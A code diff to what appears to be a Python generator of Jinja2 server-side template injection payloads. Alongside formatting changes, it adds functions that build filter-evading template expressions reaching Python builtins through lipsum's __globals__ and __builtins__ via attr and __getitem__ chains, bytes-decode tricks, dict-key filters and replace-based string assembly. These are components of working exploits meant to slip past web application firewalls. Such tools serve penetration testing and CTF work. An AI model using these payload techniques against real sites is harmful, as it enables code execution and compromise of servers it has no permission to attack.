@@ -248,7 +248,11 @@ def tree_precedence(tree):
     for target, sub_target_tree in tree:
         if target[0] in [LITERAL, UNSATISFIED]:
             pass
-        elif target[0] in [PLUS, MULTIPLY, MOD, ]:
+        elif target[0] in [
+            PLUS,
+            MULTIPLY,
+            MOD,
+        ]:
             # might be transformed into filters
             sub_target_answer = tree_precedence(sub_target_tree)
             if sub_target_answer:
@@ -270,6 +274,7 @@ def str_escape(value: str, quote="'"):
     用法："'{}'".format(str_escape("asdf", "'"))
     """
     return value.replace("\\", "\\\\").replace(quote, "\\" + quote)
+
 
 class CacheByRepr:
     def __init__(self):
@@ -296,8 +301,10 @@ class CacheByRepr:
 
     def __iter__(self):
         return (k for k_repr in self.cache for k, v in self.cache[k_repr])
+
     def clear(self):
         self.cache = {}
+
 
 class PayloadGenerator:
     """生成一个表达式，如('a'+'b')
@@ -390,9 +397,7 @@ class PayloadGenerator:
         #     return None
         return (target[1], {}, None)
 
-    @register_generate_func(
-        lambda self, target: target in self.cache_by_repr
-    )
+    @register_generate_func(lambda self, target: target in self.cache_by_repr)
     def cache_generate(self, target: Target) -> Union[PayloadGeneratorResult, None]:
         """为已经缓存的生成目标生成payload
 
@@ -893,7 +898,7 @@ def gen_multiply_func2(context: dict, a, b):
 @expression_gen
 def gen_formular_sum_simplesum(context, num_targets):
     # simply sum up with `+` without touching complex rules for PLUS
-    target_list = join_target(sep = (LITERAL, "+"), targets = num_targets)
+    target_list = join_target(sep=(LITERAL, "+"), targets=num_targets)
     return [(EXPRESSION, precedence["plus"], target_list)]
 
 
@@ -901,12 +906,15 @@ def gen_formular_sum_simplesum(context, num_targets):
 def gen_formular_sum_tuplesum(context, num_targets):
     if len(num_targets) == 1:
         return [num_targets[0]]
-    target_list = [
-        (LITERAL, "("),
-    ] + join_target(sep = (LITERAL, ","), targets = num_targets) + [
-        (LITERAL, ")|sum")
-    ]
+    target_list = (
+        [
+            (LITERAL, "("),
+        ]
+        + join_target(sep=(LITERAL, ","), targets=num_targets)
+        + [(LITERAL, ")|sum")]
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
+
 
 @expression_gen
 def gen_formular_sum_add(context, num_targets):
@@ -1021,7 +1029,7 @@ def gen_positive_integer_unicodehex(context: dict, value: int):
     if value <= 0:
         return [(UNSATISFIED,)]
     chars = [
-        chr(ord(c) + ord("０") - ord("0")) if ord("0") <= ord(c) <= ord("9") else c 
+        chr(ord(c) + ord("０") - ord("0")) if ord("0") <= ord(c) <= ord("9") else c
         for i, c in enumerate(hex(value)[2:])
     ]
     targets_list = [(LITERAL, "0x")] + [(LITERAL, c) for c in chars]
@@ -1052,13 +1060,8 @@ def gen_positive_integer_sum(context: dict, value: int):
             return [(UNSATISFIED,)]
         value_left -= ints[0][1]
         payload_vars.append(ints[0][0])
-    ints = [
-        (EXPRESSION, precedence["literal"], [(LITERAL, v)])
-        for v in payload_vars
-    ]
-    return [(FORMULAR_SUM, ints)] + [
-        (WITH_CONTEXT_VAR, v) for v in payload_vars
-    ]
+    ints = [(EXPRESSION, precedence["literal"], [(LITERAL, v)]) for v in payload_vars]
+    return [(FORMULAR_SUM, ints)] + [(WITH_CONTEXT_VAR, v) for v in payload_vars]
 
 
 @expression_gen
@@ -1534,12 +1537,48 @@ def gen_string_percent_lipsum3(context):
 
 
 @expression_gen
-def gen_string_percent_lipsum4(context):  # TODO: use variables
+def gen_string_percent_lipsum4(context):
     return [
         (
             EXPRESSION,
             precedence["function_call"],
-            [(LITERAL, "lipsum['__glob''als__']['__builti''ns__']['chr'](37)")],
+            [
+                (LITERAL, "lipsum["),
+                (VARIABLE_OF, "__globals__"),
+                (LITERAL, "]["),
+                (VARIABLE_OF, "__builtins__"),
+                (LITERAL, "]["),
+                (VARIABLE_OF, "chr"),
+                (LITERAL, "]("),
+                (INTEGER, 37),
+                (LITERAL, ")"),
+            ],
+        )
+    ]
+
+
+@expression_gen
+def gen_string_percent_lipsum5(context):
+    # lipsum|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("chr")(37)
+    return [
+        (
+            EXPRESSION,
+            precedence["function_call"],
+            [
+                (LITERAL, "lipsum|attr("),
+                (VARIABLE_OF, "__globals__"),
+                (LITERAL, ")|attr("),
+                (VARIABLE_OF, "__getitem__"),
+                (LITERAL, ")("),
+                (VARIABLE_OF, "__builtins__"),
+                (LITERAL, ")|attr("),
+                (VARIABLE_OF, "__getitem__"),
+                (LITERAL, ")("),
+                (VARIABLE_OF, "chr"),
+                (LITERAL, ")("),
+                (INTEGER, 37),
+                (LITERAL, ")"),
+            ],
         )
     ]
 
@@ -2447,6 +2486,28 @@ def gen_string_lowerfilter2(context: dict, value: str):
 
 
 @expression_gen
+def gen_string_lowerfilterdict1(context: dict, value: str):
+    if value.upper().lower() != value or not re.match(
+        r"^[A-Za-z_][A-Za-z0-9_]+$", value
+    ):
+        return [(UNSATISFIED,)]
+    chars = [str_escape(c, '"') for c in value.upper()]
+    target_list = [(LITERAL, "dict({}=x)|first|lower".format("".join(chars)))]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_string_lowerfilterdict2(context: dict, value: str):
+    if value.upper().lower() != value or not re.match(
+        r"^[A-Za-z_][A-Za-z0-9_]+$", value
+    ):
+        return [(UNSATISFIED,)]
+    chars = [str_escape(c, '"') for c in value.upper()]
+    target_list = [(LITERAL, "dict({}=x)|last|lower".format("".join(chars)))]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
 def gen_string_concat1(context: dict, value: str):
     target_list = [
         (
@@ -2479,6 +2540,22 @@ def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     target_list = [(LITERAL, "dict({}=x)|join".format(value))]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_string_dictfirst(context: dict, value: str):
+    if not re.match("^[a-zA-Z_]+$", value):
+        return [(UNSATISFIED,)]
+    target_list = [(LITERAL, "dict({}=x)|first".format(value))]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_string_dictfirstreverse(context: dict, value: str):
+    if not re.match("^[a-zA-Z_]+$", value):
+        return [(UNSATISFIED,)]
+    target_list = [(LITERAL, "dict({}=x)|first|reverse".format(value[::-1]))]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
@@ -2579,6 +2656,91 @@ def gen_string_splitdictjoin3(context: dict, value: str):
 
 
 @expression_gen
+def gen_string_lipsumtobytes4(context: dict, value: str):
+    value_tpl = (
+        [(LITERAL, "(")]
+        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+        + [(LITERAL, ")")]
+    )
+    bytes_targets_noendbracket = (
+        [
+            (LITERAL, "lipsum["),
+            (VARIABLE_OF, "__globals__"),
+            (LITERAL, "]["),
+            (VARIABLE_OF, "__builtins__"),
+            (LITERAL, "]["),
+            (VARIABLE_OF, "bytes"),
+            (LITERAL, "]("),
+        ]
+        + value_tpl
+    )
+    target_list1 = bytes_targets_noendbracket + [
+        (LITERAL, ")"),
+        (LITERAL, "["),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, "]()"),
+    ]
+    target_list2 = bytes_targets_noendbracket + [
+        (LITERAL, ",)"),
+        (LITERAL, "["),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, "]()"),
+    ]
+    return [
+        (
+            EXPRESSION,
+            precedence["function_call"],
+            [(ONEOF, target_list1, target_list2), ]
+        )
+    ]
+
+
+@expression_gen
+def gen_string_lipsumtobytes5(context: dict, value: str):
+    value_tpl = (
+        [(LITERAL, "(")]
+        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+        + [(LITERAL, ")")]
+    )
+    bytes_targets_noendbracket = (
+        [
+            (LITERAL, "lipsum|attr("),
+            (VARIABLE_OF, "__globals__"),
+            (LITERAL, ")|attr("),
+            (VARIABLE_OF, "__getitem__"),
+            (LITERAL, ")("),
+            (VARIABLE_OF, "__builtins__"),
+            (LITERAL, ")|attr("),
+            (VARIABLE_OF, "__getitem__"),
+            (LITERAL, ")("),
+            (VARIABLE_OF, "bytes"),
+            (LITERAL, ")("),
+        ]
+        + value_tpl
+    )
+    target_list1 = bytes_targets_noendbracket + [
+            (LITERAL, ")"),
+            (LITERAL, "|attr("),
+            (VARIABLE_OF, "decode"),
+            (LITERAL, ")()"),
+        ]
+    target_list2 = bytes_targets_noendbracket + [
+            (LITERAL, ",)"),
+            (LITERAL, "|attr("),
+            (VARIABLE_OF, "decode"),
+            (LITERAL, ")()"),
+        ]
+    return [
+        (
+            EXPRESSION,
+            precedence["filter"],
+            [(ONEOF, target_list1, target_list2), ]
+        )
+    ]
+
+
+
+@expression_gen
 def gen_string_formatpercent(context: dict, value: str):
     # (('%c'*n)%(97,98,99))
     number_tuple = (
@@ -2668,6 +2830,56 @@ def gen_string_chars2(context: dict, value: str):
         + join_target((LITERAL, ","), [(CHAR, c) for c in value])
         + [(LITERAL, ")|join")]
     )
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_string_joinbyreplace(context: dict, value: str):
+    # 12|replace(1,a)|replace(2,b)
+    if re.search(r"\d", value) or len(value) == 1:
+        return [(UNSATISFIED,)]
+    split = len(value) // 2
+    if len(value) > 2 and value[:2] == "__":
+        split = 2
+    elif len(value) > 2 and value[-2:] == "__":
+        split = -2
+    target_list = [
+        (INTEGER, 12),
+        (LITERAL, "|replace("),
+        (INTEGER, 1),
+        (LITERAL, ","),
+        (STRING, value[:split]),
+        (LITERAL, ")|replace("),
+        (INTEGER, 2),
+        (LITERAL, ","),
+        (STRING, value[split:]),
+        (LITERAL, ")"),
+    ]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_string_joinbyreplace2(context: dict, value: str):
+    # 12|replace(1,a,)|replace(2,b,)
+    if re.search(r"\d", value) or len(value) == 1:
+        return [(UNSATISFIED,)]
+    split = len(value) // 2
+    if len(value) > 2 and value[:2] == "__":
+        split = 2
+    elif len(value) > 2 and value[-2:] == "__":
+        split = -2
+    target_list = [
+        (INTEGER, 12),
+        (LITERAL, "|replace("),
+        (INTEGER, 1),
+        (LITERAL, ","),
+        (STRING, value[:split]),
+        (LITERAL, ",)|replace("),
+        (INTEGER, 2),
+        (LITERAL, ","),
+        (STRING, value[split:]),
+        (LITERAL, ",)"),
+    ]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
